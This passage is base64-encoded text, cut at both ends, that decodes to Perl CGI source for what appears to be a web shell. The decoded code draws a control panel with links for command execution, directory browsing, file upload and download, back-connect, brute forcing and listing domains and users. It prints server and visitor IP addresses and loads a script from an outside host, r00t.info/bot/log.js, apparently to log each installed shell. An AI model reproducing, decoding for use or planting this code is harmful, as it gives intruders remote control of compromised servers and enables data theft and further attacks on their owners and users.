w0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyDQojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCW15ICRkaXIgPSRDdXJyZW50RGlyOw0KCSRkaXI9fiBzL1xcL1xcXFwvZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQo8dGl0bGU+ICA8L3RpdGxlPg0KDQokSHRtbE1ldGFIZWFkZXINCg0KPC9oZWFkPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCn0NCnRyIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICNmZjk5MDA7DQp9DQp0ZCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCmNvbG9yOiAjMkJBOEVDOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KDQp0YWJsZSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7DQp9DQoNCg0KaW5wdXQgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KDQppbnB1dC5zdWJtaXQgew0KdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KY29sb3I6ICNGRkZGRkY7DQpib3JkZXItY29sb3I6ICMwMDk5MDA7DQp9DQoNCmNvZGUgew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6IHdoaWxlOw0KfQ0KDQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsNCmNvbG9yOiAjRkYwMEFBOw0KfQ0KDQp0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCg0KLmxpc3RkaXIgdHI6aG92ZXJ7DQoJYmFja2dyb3VuZDogIzQ0NDsNCn0NCi5saXN0ZGlyIHRyOmhvdmVyIHRkew0KCWJhY2tncm91bmQ6ICM0NDQ7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7DQp9DQoubm90bGluZXsNCgliYWNrZ3JvdW5kOiAjMTExOw0KfQ0KLmxpbmV7DQoJYmFja2dyb3VuZDogIzIyMjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQ0Kew0KCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLw0KCXZhciBhamF4PSIiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlUGVybXNfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1jaG1vZCB0eXBlPXRleHQgc2l6ZT01IC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCXZhciBhamF4PSIiOw0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2NjMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiMwMDAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+S29tdXQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVkQ3VycmVudERpciI+RGl6aW48L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgQ29ubmV0PC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSByMDB0LmluZm8gPC9mb250Pjxicj48YnI+DQo8dGFibGUgYWxpZ249ImNlbnRlciIgYm9yZGVyPSIxIiB3aWR0aD0iNjAwIiBoZWlnaD4NCjxzY3JpcHQgc3JjPWh0dHA6Ly9yMDB0LmluZm8vYm90L2xvZy5qcz48L3NjcmlwdD4NCjx0Ym9keT48dHI+DQo8dGQgdmFsaWduPSJ0b3AiIGJhY2tncm91bmQ9Imh0dHA6Ly9kbC5kcm9wYm94LmNvbS91LzEwODYwMDUxL2ltYWdlcy9tYXRyYW4uZ2lmIj48cCBpZD0iaGFjayIgc3R5bGU9Im1hcmdpbi1sZWZ0OiAzcHg7Ij4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gUGxlYXNlIFdhaXQgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFRyeWluZyBjb25uZWN0IHRvIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjRjAwMDAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+flwkPC9mb250PiBDb25uZWN0ZWQgISA8L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+DQoNCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBUcnlpbmcgY29ubmVjdCB0byBDb21tYW5kIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQoNCjxmb250IGNvbG9yPSIjRjAwMDAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PlwkIENvbm5lY3RlZCBDb21tYW5kISA8L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48Zm9udCBjb2xvcj0iI0YwMDAwMCI+XCQ8L2ZvbnQ+PC9mb250PiBPSyEgWW91IGNhbiBraWxsIGl0ITwvZm9udD4NCjwvdHI+DQo8L3Rib2R5PjwvdGFibGU+DQo8YnI+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOw0KVHlwaW5nVGV4dC5ydW5BbGwoKTsNCg0KPC9zY3JpcHQ+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsNCglteSAkdGV4dCA9IHNoaWZ0Ow0KCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOw0KCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsNCgkkdGV4dCA9fiBzLycvJiMwMzk7L2c7DQoJJHRleHQgPX4gcy88LyZsdDsvZzsNCgkkdGV4dCA9fiBzLz4vJmd0Oy9nOw0KCXJldHVybiAkdGV4dDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGxpbmsgZm9yIGRpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEFkZExpbmtEaXIoJCkNCnsNCglteSAkYWM9c2hpZnQ7DQoJbXkgQGRpcj0oKTsNCglpZigkV2luTlQpDQoJew0KCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOw0KCX1lbHNlDQoJew0KCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOw0KCX0NCglteSAkcGF0aD0iIjsNCglteSAkcmVzdWx0PSIiOw0KCWZvcmVhY2ggKEBkaXIpDQoJew0KCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsNCgkJJHJlc3VsdC49IjxhIGhyZWY9Jz9hPSIuJGFjLiImZD0iLiRwYXRoLiInPiIuJF8uJFBhdGhTZXAuIjwvYT4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8YnI+TG